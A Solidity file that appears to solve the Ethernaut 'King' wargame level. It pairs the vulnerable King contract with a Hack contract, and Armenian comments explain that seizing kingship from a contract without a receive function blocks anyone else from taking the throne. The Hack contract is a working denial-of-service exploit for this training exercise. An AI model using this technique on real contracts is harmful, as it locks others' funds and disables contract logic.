// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// khaghi npataky: ov naxordic shat pogha poxancum inqy darnu a king, nakhordin el ira poghy het a agalis, asum a jardi nenec vor du mnas
// kareli anel ha.ck contr-ov ughaki mejy reciev chdnelov vor ed contracti vra hnaravor chlini pogh poxancel...qqani vor selfdestruct chi kara ani
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // hin tagavorin gceric gceluc heto poghy ugharkum enq iranmsg value
    king = msg.sender; //hima nor inqyna darnum
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Hack{
    function hack(address _king) external payable{
        require(msg.value == 2 ether, "Invalid sum!");
       (bool success,) =_king.call{value: msg.value}("");
       require(success);
    }





}